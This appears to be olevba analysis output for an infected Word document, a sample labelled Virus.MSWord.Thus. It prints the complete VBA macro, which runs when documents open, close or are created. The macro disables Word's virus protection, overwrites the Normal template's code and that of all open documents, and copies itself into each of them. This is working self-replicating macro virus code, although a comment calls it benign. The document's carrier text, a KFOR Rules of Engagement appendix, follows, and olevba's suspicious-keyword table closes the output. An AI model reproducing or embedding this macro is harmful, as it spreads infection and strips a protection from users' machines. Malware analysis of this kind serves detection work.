olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Thus-based-464a6d1558af137f22d57ddff7daf2968f8508bc
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Thus-based-464a6d1558af137f22d57ddff7daf2968f8508bc - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
'Thus_001'
'Anti-Smyser'
' This virus is an alteration of a virus which was
' designed to delete all files from one's C: drive on Dec 13th.
' This code is completely benign.
    On Error Resume Next
    Application.Options.VirusProtection = False
    If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(3, 1) <> "'Anti-Smyser'" Then
        NormalTemplate.VBProject.VBComponents.Item(1).CodeModule _
        .DeleteLines 1, NormalTemplate.VBProject.VBComponents.Item(1) _
        .CodeModule.CountOfLines
    End If
    If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines = 0 Then
        NormalTemplate.VBProject.VBComponents.Item(1).CodeModule _
        .InsertLines 1, ActiveDocument.VBProject.VBComponents.Item(1) _
        .CodeModule.Lines(1, ActiveDocument.VBProject.VBComponents _
        .Item(1).CodeModule.CountOfLines)
    End If
    If NormalTemplate.Saved = False Then NormalTemplate.Save
    
    For k = 1 To Application.Documents.Count
        If Application.Documents.Item(k).VBProject.VBComponents.Item(1).CodeModule.Lines(3, 1) <> "'Anti-Smyser'" Then
            Application.Documents.Item(k).VBProject.VBComponents.Item(1) _
            .CodeModule.DeleteLines 1, Application.Documents.Item(k) _
            .VBProject.VBComponents.Item(1).CodeModule.CountOfLines
        End If
        If Application.Documents.Item(k).VBProject.VBComponents.Item(1).CodeModule.CountOfLines = 0 Then
            Application.Documents.Item(k).VBProject.VBComponents.Item(1) _
            .CodeModule.InsertLines 1, NormalTemplate.VBProject.VBComponents _
            .Item(1).CodeModule.Lines(1, NormalTemplate.VBProject _
            .VBComponents.Item(1).CodeModule.CountOfLines)
        End If
    Next k
End Sub
Private Sub Document_Close()
    Document_Open
End Sub
Private Sub Document_New()
    Document_Open
End Sub






























































APPENDIX 2 TO
ANNEX E TO
OPLAN 31402
DATED 23 DEC 99

RULES OF ENGAGEMENT FOR  LAND OPERATIONS

INTRODUCTION. The Rules of Engagement (ROE) contained in this compendium are for the use of the Kosovo Force (KFOR) land forces, when authorised in accordance with the procedure described in paragraph 3.a. (2). of Annex E.

NUMBERED ROE. The following ROE, when authorised by the North Atlantic Council (NAC), permit KFOR forces to use minimum force in the circumstances specified under the ROE which follow:

L01 Use of minimum force to prevent any attempts by hostile forces/belligerents to prevent the KFOR from discharging its duties is authorised.
    
L02 Use of minimum force to defend friendly forces and Persons with Designated Special Status (PDSS) against hostile acts is authorised.

L03 Use of minimum force to defend friendly forces and Persons with Designated Special Status (PDSS) against forces demonstrating hostile intent is authorised.

L04 Use of minimum force to prevent the taking possession of or destruction of force property is authorised.

L05 Use of minimum force to prevent the taking possession of or destruction of property with designated special status is authorised.  Individual service personnel are to be informed when they are protecting specific property on this basis.

L06 Use of minimum force to defend against intrusion by hostile forces/ belligerents into Assembly Areas, Military Restricted Areas or other areas designated by an Authorised Commander is authorised.

L07 Use of minimum force against any armed individuals who fail to comply with instructions issued by KFOR personnel engaged in the execution of their duties is authorised.

L08 Detention of hostile forces/belligerents who obstruct friendly forces, but only after appropriate non-forcible attempts to negate such obstruction have failed, is authorised.

L09 Detention of hostile forces/belligerents who attempt to enter controlled areas, commit assaults on friendly forces, commit or threaten to commit serious crimes against friendly forces or attack friendly force property is authorised.

L10 Detention of civilians who obstruct the progress of friendly forces whether by demonstration, riot, or other means is authorised.

L11 Detention of civilians who enter or attempt to enter, without authority, any area controlled by friendly forces is authorised.

L12 Detention of civilians who commit any assault upon any member of friendly forces is authorised.

L13 Detention of civilians who commit or threaten to commit a serious crime in the presence of a member of friendly forces is authorised.

L14 Detention of civilians who attack friendly force property is authorised.

L15 Use of minimum force to prevent the escape of any detained person is authorised. Any use of deadly force must be in accordance with the Commander's Aide-Memoire.1

L16 Disarming armed individuals or groups which represent an actual threat to the security of friendly forces is authorised.

L17 Seizure or destruction of arms, military equipment or vehicles which represent an actual threat to the security of friendly forces is authorised.

L18 Firing of warning shots is authorised.

L19 Use of riot control means against non-belligerents in circumstances deemed appropriate by an Authorised Commander is authorised.

L20 Use of indirect fire is authorised in accordance with paragraph 3.a. (10). of Annex E.

L21 Engaging targets acquired or identified by other than visual means is authorised when approved by the Appropriate Unit Commander.

L22 Use of all illuminants or illumination systems is authorised.

L23 Searches of persons, vehicles, and property in the execution of authorised duties, incidental to authorised detentions, or when there are reasons to suspect the presence of arms, ammunition or military equipment are authorised.

L24 Use of minimum force against hostile forces/belligerents or targets which provide active support to hostile military actions against friendly forces is authorised.

L25 Use of force against hostile forces/belligerents that have committed a hostile act against friendly forces previously, but are not presently committing a hostile act is authorised, provided such action is reasonably proximate and meets the requirements of timeliness, military necessity, and proportional/ minimum use of force.

L26 Use of minimum force, against an individual who unlawfully commits, or is about to commit, an act which endangers life, or is likely to cause serious bodily harm, in circumstances where there is no other way to prevent the act, is authorised.

L27 After an appropriate warning has been given, use of electronic emissions to jam or override desig transmissions in desig part of the Federal Republic of Yugoslavia (FRY) is authorised.

L28 After an appropriate warning has been given, use of minimum force to deny the use of desig element of media production, transmission or associated relay system in desig part of the FRY is authorised.

L29 After an appropriate warning has been given, use of minimum force to destroy desig element of media production, transmission or associated relay system in desig part of the FRY is authorised.

L30 Unrestricted use of ECM is authorised.

L31 Detention of persons indicted by the International Criminal Tribunal for the Former Yugoslavia with whom KFOR forces come into contact in the execution of their assigned tasks is authorised.

GENERAL CONSIDERATIONS.

Use of Force.  The amount of force used in situations where use of force is authorised is to be based on the judgement of the Appropriate Unit Commander or individual on-scene commander consistent with the requirements of Military Necessity and Proportional/Minimum Force as outlined in this Annex.

Detention of Hostile Forces / Belligerents or Civilians.    Once detained, hostile forces/belligerents or civilians will be disarmed, if necessary, and at the discretion of the on-scene commander, either released or removed to designated sites for hand-over to military police for eventual transfer to an appropriate representative of UNMIK or another appropriate agency as determined by COMKFOR, as soon as possible. Up until the detained person is handed over to UNMIK or another appropriate agency, the on-scene commander may release any detainee, if in his judgement, it is appropriate to do so. All detained persons shall be treated humanely and in accordance with internationally recognised standards of human rights.

Detention of Persons Indicted for War Crimes (PIFWC).   Once detained, persons indicted for war crimes by the International Criminal Tribunal for the former Yugoslavia (ICTY) shall be handed over as soon as is practicable to a representative of the Tribunal.  At the latest, this transfer should take place within 48 hours of the initial detention.

d.  Warning Shots. When authorised by ROE, warning shots may be fired whenever, in the opinion of the on-scene commander:

(1) They would deter an armed hostile or potentially hostile individual or group or forces or belligerents from obstructing the mission, or from threatening the safety of members of friendly forces, PDSS, or vehicles under his command.

(2) It is necessary for the execution of the mission to manifest resolve to an armed hostile or potentially hostile individual or group or hostile forces/ belligerents.

(3) They would deter or prevent a civilian individual, group or crowd, which poses a threat to the safety of members of friendly forces, PDSS or force property under his command, from engaging those forces, PDSS or force property.

e.  Riot Control Means.   Subject to sub-paragraph 6.a. of this Appendix, riot control means may be employed against non-belligerents at the discretion of the Appropriate Commander whenever, in his judgement, the use of armed force or warning shots would be inappropriate and:

(1) The safety of friendly forces or PDSS is threatened; or,

(2) Vehicles or property belonging to friendly forces or PDSS are similarly threatened; or,

(3) the passage of friendly forces, PDSS, vehicles, or property with designated special status under his responsibility is blocked by civilians and in his judgement, the use of armed force or warning shots is not, at that time, necessary.

f.  Prevention of Serious Crimes.

(1) When authorised, appropriate measures, up to and including the use of deadly force, may be used to prevent serious crimes in the following circumstances:

(a) The ROE permit the use of force to protect PDSS against hostile acts and against forces demonstrating hostile intent.  Therefore, COMKFOR may extend KFOR protection to specific groups or individuals whom he perceives to be under threat.

(b) ROE L26 permits the use of minimum force, against an individual who unlawfully commits, or is about to commit, an act which endangers life, or is likely to cause serious bodily harm, in circumstances where there is no other way to prevent the act.

(2) The ROE permit the on scene commander to detain civilians who commit or threaten to commit  a serious crime in the presence of a member of friendly forces or to detain hostile forces/belligerents who commit or threaten to commit serious crimes against friendly forces.

(3)    All suspected serious crimes must be reported to the chain of command.

g.  Provide Active Support.  For the purpose of ROE L24, "provide active support" means any action which directly or substantially contributes to the hostile act by hostile forces/belligerents against friendly forces, for example, a forward artillery observer/air controller directing ground or air fire.

4.  LIMITATIONS. Unless directed by COMKFOR or CINCSOUTH or in cases of self-defence there is no authority to:

a.  Fire at religious buildings or facilities, museums, or cultural or historic works.

b.  Fire into areas, buildings or houses populated by civilians.

c.  Destroy bridges, tunnels, dams, or dikes.

d.  Use herbicides except for the control of vegetation within or around the defined perimeters of the compound of friendly forces.

5.  PROHIBITIONS.   It is prohibited to:

a.  Use any incendiary weapon (this does not include use of ammunition such as white phosphorous used solely for target marking or identification, where incendiary purpose is not intended).

b.  Employ a means of delivery of mines that cannot be directed at a specific military objective.

c.  Employ a means of delivery of mines which may be expected to cause incidental loss of civilian life, injury to civilians, damage to civilian objects, or combination thereof, which would be excessive in relation to the concrete and direct military advantage anticipated.

d.  Employ booby trap devices.

e.  Destroy civilian buildings not being used for military purposes except where such destruction has been authorised under ROE.

6.  SPECIFIC GUIDANCE.

a.  Weapons/Weapon Systems Restrictions.   The use of certain weapons and weapon systems is delegated to Appropriate Commanders as shown in the table below.

SERIAL

(a) WEAPONS/
Weapons SYSTEMS / TARGETS
(b) FIRE RELEASE
Authority
(c) LOWEST LEVEL
OF DELEGATION
(d)
1   Close Air Support Ordnance  COMKFOR/ CINCSOUTH  Battalion (Bn)
2   Attack Helicopters  Same    Brigade/Air Ground Task Force
3   Artillery   Same    Brigade/Air Ground Task Force
4   Air Defence     Same    Battalion
5   Mortars Battalion   Company
6   Tank    Battalion   Company
7   Anti-Tank   Battalion   Company
8   Other Crew Served Weapons   Battalion   Company
9   Riot/Crowd Control Means    SACEUR/ COMKFOR
10  Land Mines  SACEUR/ COMKFOR
11  Explosive Demolitions   SACEUR/ COMKFOR
12  Attack against religious or cultural property   SACEUR/ COMKFOR Brigade

b.  Controlled Weapons/Ordnance.   The use of the following weapons systems and ordnance is to be strictly controlled as shown:

(1) Unattended Weapons.    Unattended means of force, including booby traps, are prohibited except that land mines could be authorised by ROE, in which case they are subject to the restrictions in sub-paragraphs 5.b. and 5.c. above and they are to be fenced and clearly marked, remotely controlled or self-destructing/self-deactivating as applicable.  In addition, they should be recorded and monitored and then cleared on completion of the military operation as appropriate.

(2) Lethal or Incapacitating Chemical Weapons.   The use of such weapons is prohibited. However, riot control means are not included within this category. When authorised, riot control means may be employed, but only as authorised above or in self-defence.

c.  Air Operations in Support of the Mission.   Air support provides an important degree of security to deployed friendly forces, particularly when faced with significant hostile forces/belligerents. The ROE for air forces operating in support of the mission are at Appendix 3 (Air ROE).

d.  Authority To Search.   Persons, vehicles, and property may be searched in the following situations and under the procedures set out at Tab C:

(1) In execution of authorised duties.

(2) Incidental to authorised detentions.

(3) Where there are reasons to suspect the presence of arms, ammunition or military equipment.

e.  Authorised Commander.   The following are Authorised Commanders for land ROE:
    
(1) COMKFOR

    (2) COMSTRIKFORSOUTH

f.Aide -Memoire, Soldier 's Card and Search Procedures. The Aide-Memoire (Tab A) is NAC Guidance to KFOR commanders to be carried out by trainers during training of commanders, Non-Commissioned Officers (NCOs) and soldiers on how to implement the ROE and as an aid to commanders in the field.  The Soldier's Card (Tab B) is intended to be used with the training program and in the field.  It is a short statement of guidance on authorised use of force in self-defence and for the execution of the mission. It is intended that a Soldier's Card be carried by each individual soldier. A soldier may carry a Soldier's Card issued by COMKFOR or KFOR Troop Contributing Nations may issue their own translations of the Soldier's Card issued by COMKFOR which may include amplifying instructions issued by National forces in accordance with Annex E paragraph 3.a. (1). (b).  Tab C is NAC Guidance on procedures for the conduct of searches by KFOR forces.  Translations of Tabs A, B or C or amplifying instructions issued by National
 forces must be developed in consultation with COMKFOR or CINCSOUTH as appropriate.


TABS:

TAB A       Aide-Memoire for Kosovo Force Commanders.
TAB B       Example of a Soldier's Card.
TAB C       Search Procedures.

















`

















































































+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
+----------+--------------------+---------------------------------------------+

